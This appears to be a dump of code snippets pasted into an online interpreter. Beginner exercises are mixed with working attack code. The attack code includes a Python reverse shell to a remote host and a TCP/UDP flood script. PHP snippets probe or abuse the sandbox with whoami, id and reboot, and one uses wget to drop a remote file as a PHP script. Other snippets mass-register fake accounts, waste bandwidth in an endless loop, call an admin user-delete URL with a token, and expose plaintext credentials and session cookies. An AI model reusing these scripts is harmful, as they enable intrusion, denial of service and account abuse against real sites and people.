                                                      print(1+2)
========================================================================================

                                                    import requests, time

def login():
  p = {
      "n": "eizere@mail.ru",
      "pw": "Gnb8m5uc9e@2Cse",
      "rmb": 1,
      "signIn": "Sign in"
  }
  s = requests.Session()
  s.post('https://notepad.yanobs.com/en/login', data=p)
  return s

def save_text(s, text, title=None, note_id=None):
    p = {
        "MAX_FILE_SIZE": 10000000,
        "t": title,
        "c": text,
        "noteId": note_id,
        "a": "s"
    }
    r = s.post('https://notepad.yanobs.com/en/',data=p)
    return r.status_code


s = login()
save_text(s, 'snippet', f'snippet')
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python O nline Interpreter")
========================================================================================

                                                    import os  # for deleting files
import os.path  # for getting filename from url
import requests  # for downloading files
import time  # for adding delays
import random  # for choosing random urls
from urllib import request  # Import request module from urllib

headers = {
  'if-modified-since': 'Tue, 15 Dec 2020 17:03:37 GMT',
  'accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'accept-encoding':
  'gzip, deflate, br',
  'accept-language':
  'en',
  'cache-control':
  'max-age=0',
  'dnt':
  '1',
  'referer':
  'https://v.animethemes.moe/',
  'sec-ch-ua':
  '"Google Chrome";v="110", "Chromium";v="110", ";Not A Brand";v="24"',
  'sec-ch-ua-mobile':
  '?0',
  'sec-ch-ua-platform':
  '"Windows"',
  'if-none-match':
  "a4bad059bb3921e4a7018bacf87f22b5",
  'sec-fetch-dest':
  'document',
  'sec-fetch-mode':
  'navigate',
  'sec-fetch-site':
  'none',
  'sec-fetch-user':
  '?1',
  'cache-control':
  'max-age=0',
  'upgrade-insecure-requests':
  '1',
  'user-agent':
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  'cookie': 'XSRF-TOKEN=eyJpdiI6IkprTHdNcHNVenErR0lwMnBHMXpLV0E9PSIsInZhbHVlIjoiemZPMXdvZG9Tc2xUQ001bHJIRFBaTm9YZHlDUTVPc05qb2U0bGQ5Ny9qL3IveEdYNi9OZmg5Q2pjVW0zN3BJTmEvOG9VRk4vMXdhaVVPOU1IczltOTU0aGg2S3p3RmpEb0lWSjlrY3Z6VzF6WjFqQ0VWOEF2WTJ2WWhwekJwbUkiLCJtYWMiOiJkN2U3NjYyZGVmYzVjMjA3OTQwMzExZDM3OWI5YWVlYTVlNTNiYTg5YzcxM2ZjYjE1NGQ0Yzc2YjU4NTg5OTk4IiwidGFnIjoiIn0%3D; animethemes_session=eyJpdiI6IjNMa0NVK0ZaOHp6d3plU0pmMFZvWlE9PSIsInZhbHVlIjoiNjZhaEgvYmpQQmFwaVNDOWZHejBtUXNMUDNqazlVcDdzS20rT0RsaWVuQTRBbXZyWWZieXRTY3IrK2wzY29DVVRrS21hSVJweDhEN2xxdXQrb2lHSk9uSDJLWVF5OEFLRzVOdWJac3VWL01NNkcwOWZsQ0lRRThCOEJsaHluUHUiLCJtYWMiOiJiYTJiMTcyYTFjZjNkMjRkMGIwOWFhY2I1MTcwZjUzYWIxY2U0ZjE1M2I3YmNkMDM2YmFlNDE2ODY3YjIyZjBiIiwidGFnIjoiIn0%3D'
}

# Define the URL of the text file
url = "https://pastebin.com/raw/y92g8qu0"

# Open the file and read its contents
webf = request.urlopen(url)
webf = request.urlopen(url)
txt = [line.decode() for line in webf.readlines()]

# Create an empty list to store the proxies
proxies = []

# Loop through each line of the file
for line in txt:
  # Strip any whitespace characters
  line = line.strip()
  # Split the line by ":" into four parts
  ip, port, username, password = line.split(":")
  # Join them back with "@" in the desired format
  proxy = username + ":" + password + "@" + ip + ":" + port
  # Append the proxy to the list
  proxies.append(proxy)

urls = [
  "https://v.animethemes.moe/DomesticNaKanojo-OP1-NCBD1080.webm",
  "https://v.animethemes.moe/KissxSisTV-OP1.webm",
  "https://v.animethemes.moe/YosugaNoSora-OP1.webm"
]  # an array of urls

proxy_count = 0  # index counter
counter = 0  # a variable to count how many times the file has been downloaded
bandwidth = 0  # a variable to keep track of how much bandwidth has been used

while True:  # loop forever
  try:
    url = random.choice(urls)  # choose a random url from the array
    filename = os.path.basename(
      url)  # get the last part of the url as filename
    response = requests.get(
      url, headers=headers)  # make a GET request and get the response object
    with open(filename, 'wb') as f:  # open a file object in write binary mode
      f.write(
        response.content)  # write the response content to the file object
    counter += 1  # increment the counter by 1
    file_size = os.path.getsize(
      filename)  # get the actual size of the file in bytes
    bandwidth += file_size  # add the file size to the bandwidth
    print("\nDownloaded", filename, counter,
          "times")  # print a message with counter value

    if bandwidth < (1 << 30):  # if bandwidth is less than 1 GB
      print("Used", bandwidth / (1 << 20),
            "MB of bandwidth")  # print bandwidth in MB
    else:  # otherwise
      print("Used", bandwidth / (1 << 30),
            "GB of bandwidth")  # print bandwidth in GB

    time.sleep(1)  # wait for 1 second
    os.remove(filename)  # delete the file
    print("Deleted", filename)  # print a message

  except Exception as e:
    print("Failed to connect to animethemes.moe:", e)
    """
    if proxy_count + 1 == len(proxies):
      print(f"{proxies[proxy_count]} failed, using {proxies[0]} instead")
      proxy_count = 0
    else:
      print(
        f"{proxies[proxy_count]} failed, using {proxies[proxy_count + 1]} instead"
      )
      proxy_count += 1
    """
========================================================================================

                                                    i = 0
while i<=10
print(i)
i +=1
========================================================================================

                                                    i = 0
while i<=10
return(i)
i +=1
========================================================================================

                                                    python page.py
========================================================================================

                                                    # output: Hello World
print( "Hello World" )
python page.py
========================================================================================

                                                    if 10 == 8: 
   print( "it's not correct" )
========================================================================================

                                                    # output: Hello World
print( "Hello World" )
========================================================================================

                                                    # output: Hello World
print( "Hello World" )
========================================================================================

                                                    L = []
for element in range(0,9):
     L.append(5)
L.insert(2,10)
L[3] += 1
L[2] -= 3
L[1] = 'fred'
L.append(3)
L.extend([7,8])
print(len(L))
print(L)
del L[0]
del L[8:10]
print(L)
print(L.index(6))
print(L.count(7))
L.remove(8)
print(len(L))
print(L)
L.pop(0)
print(len(L))
print(L)
========================================================================================

                                                    await fetch("https://forpro.by/wp-admin/admin-ajax.php", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------42748207741118812227786263720",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://forpro.by/configurator/?ID=35622",
    "body": "-----------------------------42748207741118812227786263720\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\
========================================================================================

                                                    import 'os'

os.system('whoami')
========================================================================================

                                                    import 'os'

os.exec('whoami')
========================================================================================

                                                    # Welcome To Python Interpreter
import hashlib
import os
from socket import socket
import sys  # Only python3 included libraries
import time
from urllib.request import Request, urlopen
from json import loads


soc = socket()


def current_time():
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    return current_time

username = input('Username?\n> ')
mining_key = input("Mining key? ['None' for no key]\n> ")
diff_choice = input(
    'Use lower difficulty? (Y/N) [Leave empty for default of True]\n> ')
if diff_choice.lower == "n":
    UseLowerDiff = False
else:
    UseLowerDiff = True

def fetch_pools():
    while True:
        try:
            response = loads(urlopen(Request("https://server.duinocoin.com/getPool")).read().decode())
            NODE_ADDRESS = response["ip"]
            NODE_PORT = response["port"]

            return NODE_ADDRESS, NODE_PORT
        except Exception as e:
            print (f'{current_time()} : Error retrieving mining node, retrying in 15s')
            time.sleep(15)

while True:
    try:
        print(f'{current_time()} : Searching for fastest connection to the server')
        try:
            NODE_ADDRESS, NODE_PORT = fetch_pools()
        except Exception as e:
            NODE_ADDRESS = "server.duinocoin.com"
            NODE_PORT = 2813
            print(f'{current_time()} : Using default server port and address')
        soc.connect((str(NODE_ADDRESS), int(NODE_PORT)))
        print(f'{current_time()} : Fastest connection found')
        server_version = soc.recv(100).decode()
        print (f'{current_time()} : Server Version: '+ server_version)
        # Mining section
        while True:
            if UseLowerDiff:
                # Send job request for lower diff
                soc.send(bytes(
                    "JOB,"
                    + str(username)
                    + ",LOW,"
                    + str(mining_key),
                    encoding="utf8"))
            else:
                # Send job request
                soc.send(bytes(
                    "JOB,"
                    + str(username)
                    + ",MEDIUM,"
                    + str(mining_key),
                    encoding="utf8"))

            # Receive work
            job = soc.recv(1024).decode().rstrip("\n")
            # Split received data to job and difficulty 
            job = job.split(",")
            difficulty = job[2]

            hashingStartTime = time.time()
            base_hash = hashlib.sha1(str(job[0]).encode('ascii'))
            temp_hash = None

            for result in range(100 * int(difficulty) + 1):
                # Calculate hash with difficulty
                temp_hash = base_hash.copy()
                temp_hash.update(str(result).encode('ascii'))
                ducos1 = temp_hash.hexdigest()

                # If hash is even with expected hash result
                if job[1] == ducos1:
                    hashingStopTime = time.time()
                    timeDifference = hashingStopTime - hashingStartTime
                    hashrate = result / timeDifference

                    # Send numeric result to the server
                    soc.send(bytes(
                        str(result)
                        + ","
                        + str(hashrate)
                        + ",Minimal_PC_Miner",
                        encoding="utf8"))

                    # Get feedback about the result
                    feedback = soc.recv(1024).decode().rstrip("\n")
                    # If result was good
                    if feedback == "GOOD":
                        print(f'{current_time()} : Accepted share',
                              result,
                              "Hashrate",
                              int(hashrate/1000),
                              "kH/s",
                              "Difficulty",
                              difficulty)
                        break
                    # If result was incorrect
                    elif feedback == "BAD":
                        print(f'{current_time()} : Rejected share',
                              result,
                              "Hashrate",
                              int(hashrate/1000),
                              "kH/s",
                              "Difficulty",
                              difficulty)
                        break

    except Exception as e:
        print(f'{current_time()} : Error occured: ' + str(e) + ", restarting in 5s.")
        time.sleep(5)
        os.execl(sys.executable, sys.executable, *sys.argv)
========================================================================================

                                                    from turtle import*
speed(20)
color('green')
bgcolor('black')
b = 200
while b > 0:
    left(b)
    forward(b * 3)
    b = b - 1
========================================================================================

                                                    # Import the modules
import numpy as np
import matplotlib.pyplot as plt

# Define the parameters
radius = 100 # radius of the circle in pixels
width = 300 # width of the image in pixels
height = 300 # height of the image in pixels
color = (255, 0, 0) # color of the circle in RGB values

# Create an empty array for the image
image = np.zeros((height, width, 3), dtype=np.uint8)

# Loop through each pixel in the image
for x in range(width):
    for y in range(height):
        # Calculate the distance from the center of the image
        distance = np.sqrt((x - width/2)**2 + (y - height/2)**2)
        # If the distance is less than or equal to the radius, set the pixel to the color
        if distance <= radius:
            image[y, x] = color

# Display the image using matplotlib
plt.imshow(image)
plt.show()
========================================================================================

                                                    translate(text, source_language='en', target_language='es'):
    API_KEY = 'your_api_key'
    url = f'https://translate.googleapis.com/translate_a/single?client=gtx&sl={source_language}&tl={target_language}&dt=t&q={text}&key={API_KEY}'
    response = requests.get(url)
    response_json = response.json()
    return response_json[0][0][0]

text = 'hello'
spanish_translation = translate(text)
print(spanish_translation) # Output: hoimport requests

def la
========================================================================================

                                                    import requests

def translate(text, source_language='en', target_language='es'):
    API_KEY = 'your_api_key'
    url = f'https://translate.googleapis.com/translate_a/single?client=gtx&sl={source_language}&tl={target_language}&dt=t&q={text}&key={API_KEY}'
    response = requests.get(url)
    response_json = response.json()
    return response_json[0][0][0]

text = 'hello'
spanish_translation = translate(text)
print(spanish_translation) # Output: hola
========================================================================================

                                                    from googletrans import Translator

def translate_to_spanish(text):
    translator = Translator(service_urls=['translate.google.com'])
    translated = translator.translate(text, dest='es')
    return translated.text

text = "Hello, how are you?"
print(translate_to_spanish(text))
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Inte
========================================================================================

                                                    <?php 
   echo "Hello World!";
   echo "this my php file";
?>
========================================================================================

                                                    <?php 
   echo "Hello World!";
   echo "this my php file"
?>
========================================================================================

                                                    # Welcome To Python Interpreter
import cv2
print("CV2")
========================================================================================

                                                    # Welcome To Python Interpreter
import cv2
========================================================================================

                                                    <?php
echo exec("ls -la");
?>
========================================================================================

                                                    <?php
echo exec("wget https://www.sbipil.net/backend/production/pdf/Mari.txt -O M4ri.php");
?>
========================================================================================

                                                    <?php 
   echo exec ("ls -la");
?>
========================================================================================

                                                    <?php 
   echo exec ("uname -a");
?>
========================================================================================

                                                    # Welcome To Python Interpreter
print("Hello jj")
========================================================================================

                                                    from pgzero import *
========================================================================================

                                                    import

========================================================================================

                                                    import sys
print(sys.version_info)
========================================================================================

                                                    var axios = require('axios');
var qs = require('qs');
const { faker } = require('@faker-js/faker');
const async = require('async');

function wait(time) {
  return new Promise(resolve => {
    setTimeout(resolve, time);
  });
}

var cargo = async.cargo(function(tasks, callback) {
  for (var i = 0; i < tasks.length; i++) {
    process(tasks[i].randomName, tasks[i].randomEmail, tasks[i].randomPass, callback)
  }
  callback();
}, 2);

var cargoQueue = async.cargoQueue(async function(tasks, callback) {
  for (var i = 0; i < tasks.length; i++) {
    process(tasks[i].randomName, tasks[i].randomEmail, tasks[i].randomPass, callback)
  }
  await wait(10);
  callback();
}, 1, 2);

let process = (randomName, randomEmail, randomPass, callback) => {
  var data = 'password=' + randomPass + '&username=' + randomName + '&rePassword=' + randomPass + '&referrer=none';

  // var data = qs.stringify({
  //   'username': randomName,
  //   'referrer': 'none',
  //   'password': randomPass,
  //   'rePassword': randomPass
  // });

  var config = {
    method: 'post',
    headers: {
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Referer': 'http://anhhung3q.choivn.com/',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest'
    },
    url: 'http://anhhung3q.choivn.com/api/users/AjaxRegister.php',
    data: data
  };

  axios(config)
    .then(function(response) {
      // process();
      console.log("Created: " + randomName + " | " + randomEmail + " | " + randomPass + ". Response Data:"  + JSON.stringify(response.data));

    })
    .catch(function(error) {
      console.log(error);
    });
}

for (i = 0; i < 1000000; i++) {
  // console.log("starting...");
  let randomName = faker.internet.userName();
  if (randomName.length >= 14) {
    randomName = randomName.slice(randomName.length - 14);
  }
  if (randomName.includes(".")) {
    randomName = randomName.replace(".", "");
  }

  if (randomName.includes("_")) {
    randomName = randomName.replace("_", "");
  }

  let randomEmail = faker.internet.email();
  if (randomEmail.length >= 25) {
    randomEmail = randomEmail.slice(randomEmail.length - 25);
  }

  const randomPass = faker.internet.password(8);

  const data = {
    randomName: randomName,
    randomEmail: randomEmail,
    randomPass: randomPass
  }

  cargoQueue.push(data, function(err) {
    // console.log('finished processing ', data);
  });

  // cargo.push(data, function(err) {
  //   console.log('finished processing ', data);
  // });
}
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")

import os 
from getpass import getpass 
def getAvailableNetworks(): 
    command = "netsh wlan show networks interface=wifi" 
    os.system(command) 
========================================================================================

                                                    #Python Code for Business Idea Analyzer 

#import required libraries 
import requests 
from bs4 import BeautifulSoup 
from selenium import webdriver 

#ask for user input 
business_idea = input("What is your business idea? ")
target_country = input("What is your target country? ")

#call the websites 
IBISWorld_url = 'https://www.ibisworld.com/' 
Statista_url = 'https://www.statista.com/'
MarketsandMarkets_url = 'https://www.marketsandmarkets.com/'
MordorIntelligence_url = 'https://www.mordorintelligence.com/'
ResearchAndMarkets_url = 'https://www.researchandmarkets.com/'

#create webdriver instance 
driver = webdriver.Chrome() 

#search for the business idea and target country on each website 
driver.get(IBISWorld_url) 
driver.find_element_by_id("query").send_keys(business_idea + " " + target_country) 
IBISWorld_results = driver.find_elements_by_class_name("result") 

driver.get(Statista_url) 
driver.find_element_by_id("query").send_keys(business_idea + " " + target_country) 
Statista_results = driver.find_elements_by_class_name("result") 

driver.get(MarketsandMarkets_url) 
driver.find_element_by_id("query").send_keys(business_idea + " " + target_country) 
MarketsandMarkets_results = driver.find_elements_by_class_name("result") 

driver.get(MordorIntelligence_url) 
driver.find_element_by_id("query").send_keys(business_idea + " " + target_country) 
MordorIntelligence_results = driver.find_elements_by_class_name("result") 

driver.get(ResearchAndMarkets_url) 
driver.find_element_by_id("query").send_keys(business_idea + " " + target_country) 
ResearchAndMarkets_results = driver.find_elements_by_class_name("result") 

#close the webdriver
driver.close()

#analyze the data collected 
if (len(IBISWorld_results) > 0 and len(Statista_results) > 0 and len(MarketsandMarkets_results) > 0 and len(MordorIntelligence_results) > 0 and len(ResearchAndMarkets_results) > 0): 
  print("The business idea is viable!") 
else: 
  print("The business idea is not viable.")
========================================================================================

                                                    <?php
 $response = file_get_contents("https://replay.az/index.php?a=admin&b=users&delete=14592&deleted=master507&token_id=42dd83bf8aab56ddcb28f7c8fb01255e");
 echo $response;
?>
========================================================================================

                                                    <?php
   $response = http_get("https://replay.az/index.php?a=admin&b=users&delete=14592&deleted=master507&token_id=42dd83bf8aab56ddcb28f7c8fb01255e");
 echo $response;
 
?>
========================================================================================

                                                    # Welcome To Python Interpreter



print("Welcome to Python Online Interpreter")
========================================================================================

                                                    <?php 
   echo `ls`;
?>
========================================================================================

                                                    <?php 
   echo `ls -l`;
?>
========================================================================================

                                                    <?php 
   echo `reboot`;
?>
========================================================================================

                                                    <?php 
   echo `id`;
?>
========================================================================================

                                                    <?php 
   echo `ls`;
?>
========================================================================================

                                                    # write your code here
i = input().split()
n1=int(i[0])
n2=int(i[2])
op=i[1]
if op=="+":
    tot = (n1 + n2)
elif op=="-":
    tot = (n1 - n2)
elif op=="*":
    tot = (n1 * n2)
elif op=="/":
    tot = (n1 / n2)

ir = int(input())

if ir == tot:
    print("Right!")
else:
    print("Wrong!")
========================================================================================

                                                    import requests

available_currency = input().lower()

r = requests.get(f"http://www.floatrates.com/daily/{available_currency}.json")

exchange_rates = {}
for currency in ("usd", "eur"):
    if currency != available_currency:
        exchange_rates[currency] = r.json()[currency]["rate"]
        
        
        
def getrates(currency_arg):
    url = "http://www.floatrates.com/daily/" + currency_arg + ".json"
    return requests.get(url).json()
    
main_currencies = ['usd','eur']
rates_cache = {key: None for key in main_currencies}

for i in main_currencies:
    rates_cache[i] = getrates(i)
========================================================================================

                                                    <?php
  
function webCrawler($url) {
    $html = file_get_contents($url);
    $dom = new DOMDocument();
    @$dom->loadHTML($html);
    $links = array();
    $xpath = new DOMXPath($dom);
    $root_domain = parse_url($url, PHP_URL_HOST);
    $hrefs = $xpath->evaluate("/html/body//a[@href]");
    $srcs = $xpath->evaluate("/html/body//*[@src]");
    
  for ($i = 0; $i < $hrefs->length; $i++) {
        $href = $hrefs->item($i);
        $link_url = $href->getAttribute('href');
        $link_host = parse_url($link_url, PHP_URL_HOST);
        if($root_domain != $link_host){
            $links[] = $link_url;
        }
    	if (strpos($link_host, "http") !== false){
			
		}
    }
    for ($i = 0; $i < $srcs->length; $i++) {
        $src = $srcs->item($i);
        $link_url = $src->getAttribute('src');
        $link_host = parse_url($link_url, PHP_URL_HOST);
        if($root_domain != $link_host ){
            $links[] = $link_url;
        }
    }
    
    return $links;
}
print_r(webCrawler('https://ktraces.de'));
========================================================================================

                                                    
print("/\")
========================================================================================

                                                    # Welcome To Python Interpreter
print("/x\")
========================================================================================

                                                    import numpy as np
import matplotlib.pyplot as plt

def normalize(vector):
    return vector / np.linalg.norm(vector)

def reflected(vector, axis):
    return vector - 2 * np.dot(vector, axis) * axis

def sphere_intersect(center, radius, ray_origin, ray_direction):
    b = 2 * np.dot(ray_direction, ray_origin - center)
    c = np.linalg.norm(ray_origin - center) ** 2 - radius ** 2
    delta = b ** 2 - 4 * c
    if delta > 0:
        t1 = (-b + np.sqrt(delta)) / 2
        t2 = (-b - np.sqrt(delta)) / 2
        if t1 > 0 and t2 > 0:
            return min(t1, t2)
    return None

def nearest_intersected_object(objects, ray_origin, ray_direction):
    distances = [sphere_intersect(obj['center'], obj['radius'], ray_origin, ray_direction) for obj in objects]
    nearest_object = None
    min_distance = np.inf
    for index, distance in enumerate(distances):
        if distance and distance < min_distance:
            min_distance = distance
            nearest_object = objects[index]
    return nearest_object, min_distance

width = 300
height = 200

max_depth = 3

camera = np.array([0, 0, 1])
ratio = float(width) / height
screen = (-1, 1 / ratio, 1, -1 / ratio) # left, top, right, bottom

light = { 'position': np.array([5, 5, 5]), 'ambient': np.array([1, 1, 1]), 'diffuse': np.array([1, 1, 1]), 'specular': np.array([1, 1, 1]) }

objects = [
    { 'center': np.array([-0.2, 0, -1]), 'radius': 0.7, 'ambient': np.array([0.1, 0, 0]), 'diffuse': np.array([0.7, 0, 0]), 'specular': np.array([1, 1, 1]), 'shininess': 100, 'reflection': 0.5 },
    { 'center': np.array([0.1, -0.3, 0]), 'radius': 0.1, 'ambient': np.array([0.1, 0, 0.1]), 'diffuse': np.array([0.7, 0, 0.7]), 'specular': np.array([1, 1, 1]), 'shininess': 100, 'reflection': 0.5 },
    { 'center': np.array([-0.3, 0, 0]), 'radius': 0.15, 'ambient': np.array([0, 0.1, 0]), 'diffuse': np.array([0, 0.6, 0]), 'specular': np.array([1, 1, 1]), 'shininess': 100, 'reflection': 0.5 },
    { 'center': np.array([0, -9000, 0]), 'radius': 9000 - 0.7, 'ambient': np.array([0.1, 0.1, 0.1]), 'diffuse': np.array([0.6, 0.6, 0.6]), 'specular': np.array([1, 1, 1]), 'shininess': 100, 'reflection': 0.5 }
]

image = np.zeros((height, width, 3))
for i, y in enumerate(np.linspace(screen[1], screen[3], height)):
    for j, x in enumerate(np.linspace(screen[0], screen[2], width)):
        # screen is on origin
        pixel = np.array([x, y, 0])
        origin = camera
        direction = normalize(pixel - origin)

        color = np.zeros((3))
        reflection = 1

        for k in range(max_depth):
            # check for intersections
            nearest_object, min_distance = nearest_intersected_object(objects, origin, direction)
            if nearest_object is None:
                break

            intersection = origin + min_distance * direction
            normal_to_surface = normalize(intersection - nearest_object['center'])
            shifted_point = intersection + 1e-5 * normal_to_surface
            intersection_to_light = normalize(light['position'] - shifted_point)

            _, min_distance = nearest_intersected_object(objects, shifted_point, intersection_to_light)
            intersection_to_light_distance = np.linalg.norm(light['position'] - intersection)
            is_shadowed = min_distance < intersection_to_light_distance

            if is_shadowed:
                break

            illumination = np.zeros((3))

            # ambiant
            illumination += nearest_object['ambient'] * light['ambient']

            # diffuse
            illumination += nearest_object['diffuse'] * light['diffuse'] * np.dot(intersection_to_light, normal_to_surface)

            # specular
            intersection_to_camera = normalize(camera - intersection)
            H = normalize(intersection_to_light + intersection_to_camera)
            illumination += nearest_object['specular'] * light['specular'] * np.dot(normal_to_surface, H) ** (nearest_object['shininess'] / 4)

            # reflection
            color += reflection * illumination
            reflection *= nearest_object['reflection']

            origin = shifted_point
            direction = reflected(direction, normal_to_surface)

        image[i, j] = np.clip(color, 0, 1)
    print("%d/%d" % (i + 1, height))

plt.imsave('image.png', image)
========================================================================================

                                                    #!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")

ip = "Enter IP here"
port = "Enter port here"
choice = "y"  #Enter y for UDP, n for TCP
times = 50000
threads = 5

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Sent!!!")
        except:
            print("[!] Error!!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sent!!!")
        except:
            s.close()
            print("[*] Error")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

========================================================================================

                                                    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("coolshark.zapto.org",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
========================================================================================

                                                    <?php 
$test = eval("dechex(10);");
if(is_null($test)){
    echo 'da';
}
========================================================================================

                                                    i=1
for i<5
 print("Hello\n")
 i++

========================================================================================

                                                    i=1
for i in range 5
 print("Hello")

========================================================================================

                                                    print ("Hello World")

========================================================================================

                                                    import random
greetings=["Hello!", "What's up?!", "Howdy!", "Greetings!"]
goodbyes=["Bye!", "Goodbye!", "See you later!", "See you soon!"]

keywords=["music", "pet", "book", "game"]
responses =["Music is so relaxing!", "Dogs are man's be friend!", "I know about a lot of books.", "I like to play video games."]

print(random.choice (greetings))
user = input("Say something (or type bye to quit): ")
user =user.lower()

while (user != "bye"): 
    keyword_found = False
for index in range(len(keywords)):
    if (keywords[index] in user):
        print("Bot: " + responses [index]) 
        keyword_found = True
if (keyword_found=False):
    new_keyword input("I'm not sure how to respond. What keyword should I respond to? ")
    keywords.append(new_keyword)
    new_response =input("How should I respond to "+ new_keyword + "?")

responses.append(new_response)
user = input("Say something (or type bye to quit): ") 
user = user.lower()
print(random. choice(goodbyes))

========================================================================================

                                                    import os,pip
import datetime,os
import socket,hashlib,shutil
import json,random,sys, time,re,marshal
from playsound import playsound
nickn=""
nickn=""
if nickn=="":
	nickn="╚»★«╝ ρΔ𝕌ｌØ Ř𝐞Ň𝐚𝓣𝕠 𝓛𝕌Ꭵ𝕤 ╚»★«╝"
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib,base64
#subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests modul not found \n requests modul installing now... \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modul not found \n sock modul installing now \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

#subprocess.run(["clear", ""])
getmac=""
oto=0
tur=0
Seri=""
csay=0
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from uuid import getnode as get_mac
#mac = "1102274947"#str(get_mac())
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
logging.captureWarnings(True)
os.system('cls')

say1=0
say2=0
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
prox=0
cpm=0
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"

#from datetime import datetime
#bugun=(datetime.today().strftime('%d-%m-%Y'))

#	#f bugun>= '30-12-2021':
#		print("""
#	Zaman Aşımı Tespit edildi, Yapımcı ile iletişim kurun
#	@FeyzullahK""")
#		quit()
	

# macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""
\33[0m\33[0m\33[1;101m                                         
🅿🅰🆁🅰🅽🅾🆁🅼🅰🅻 𝗗𝘂𝗽𝗹𝗲𝗫👌👌👌 𝙋𝙔 𝘾𝙤𝙣𝙛𝙞𝙜          
                                         
\33[0;1;5;m                                          
🔸🄺🄰🄽🄰🄻🔹🄶🄾🅁🅄🄽🅃🅄🔹🄺🄾🄽🅃🅁🄾🄻🔸                   
\33[0m\33[1;44m
           𝗤𝘂𝗮𝗱 𝗖𝗼𝗿𝗲 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗼𝗿 

     ⓂⓄⒹ ⒷⓎ Ⓟⓐⓤⓛⓞ Ⓡⓔⓝⓐⓣⓞ \33[0m
           
   \33[0;1m""")
print(feyzo)
#id1='aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvZS8yUEFDWC0xdlJOUFNBQ3RxOUNzZ0hzRzlaYlFp'
#id2='VG1WM1N6QmtVVWhuWkRGa1EyVndNV2wzZGtwMVNYRlJORWh4WW5kaFozSjFiVGx4UWkxUU5EQndVbGRFYTNRMFdWVlNjakZZTUdWaFRTOXdkV0pvZEcxcw=='
#id3=base64.b64decode(id1)+base64.b64decode(base64.b64decode(id2))
#res = ses.get(id3, timeout=15, verify=False)

#si=(str(res.text).split('sifre')[1].split('paranormal')[0])
#si=si.replace('\n','')
